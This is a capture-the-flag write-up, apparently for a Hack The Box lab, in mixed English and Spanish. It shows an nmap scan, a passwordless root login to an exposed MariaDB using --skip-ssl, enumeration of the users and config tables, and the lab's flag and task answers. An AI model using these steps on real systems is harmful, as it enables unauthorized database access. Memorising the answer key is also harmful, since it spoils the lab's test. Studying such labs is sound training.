## 🧩 Tasks

### Task 1

**During our scan, which port do we find serving MySQL?**  
👉 **3306**

---

### Task 2

**What community-developed MySQL version is the target running?**  
👉 **MariaDB 10.3.27**

---

### Task 3

**When using the MySQL command line client, what switch do we need to use in order to specify a login username?**  
👉 **-u**

---

### Task 4

**Which username allows us to log into this MariaDB instance without providing a password?**  
👉 **root**

---

### Task 5

**In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?**  
👉 *****

---

### Task 6

**In SQL, what symbol do we need to end each query with?**  
👉 **;**

---

### Task 7

**There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?**  
👉 **htb**

---

### Task 8

**What is the command in MySQL to select a database to interact with?**  
👉 **USE**

---

### Task 9

**What is the command in MySQL to show the different columns for a given table?**  
👉 **SHOW COLUMNS / DESCRIBE**

---

### Task 10

**Which table has a column named "flag"?**  
👉 **config**

---

# 🚀 Proceso de explotación

## 🔎 1. Escaneo de puertos

Se realizó un escaneo completo con Nmap:

```bash
sudo nmap -sV -sC -Pn -O --min-rate 5000 -p- 10.129.95.232
```

### 📌 Parámetros usados:

- `-sV` → detección de versiones
    
- `-sC` → scripts básicos
    
- `-Pn` → omitir ping
    
- `-O` → detección de SO
    
- `--min-rate 5000` → escaneo rápido
    
- `-p-` → todos los puertos
    

---

## 📊 Resultado del escaneo

Solo se encontró un puerto abierto:

- **3306/tcp → MySQL / MariaDB**
    
- Versión: **MariaDB 10.3.27**
    

👉 No hay otros servicios expuestos, por lo que el vector es la base de datos.

---

## 🔌 2. Intento de conexión a MySQL

```bash
mysql -h 10.129.95.232 -u root -p
```

### ❌ Error:

```text
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

👉 El servidor exige SSL pero no lo soporta correctamente.

---

## 🔓 3. Bypass SSL

Se solucionó con:

```bash
mysql -h 10.129.95.232 -u root -p --skip-ssl
```

✔ Acceso exitoso sin contraseña.

---

## 🗄️ 4. Enumeración de bases de datos

```sql
SHOW DATABASES;
```

### 📊 Resultado:

- htb (interesante)
    
- information_schema
    
- mysql
    
- performance_schema
    

👉 Se selecciona `htb`.

---

## 📂 5. Selección de base de datos

```sql
USE htb;
```

---

## 📑 6. Enumeración de tablas

```sql
SHOW TABLES;
```

### 📊 Resultado:

- config
    
- users
    

---

## 👤 7. Enumeración de usuarios

```sql
SELECT * FROM users;
```

### 📊 Resultado:

- admin
    
- lara
    
- sam
    
- mary
    

👉 Usuarios potenciales del sistema.

---

## ⚙️ 8. Revisión de configuración

```sql
SELECT * FROM config;
```

### 📊 Resultado relevante:

|name|value|
|---|---|
|flag|7b4bec00d1a39e3dd4e021ec3d915da8|

---

## 🚩 9. Flag final

👉 **7b4bec00d1a39e3dd4e021ec3d915da8**

    
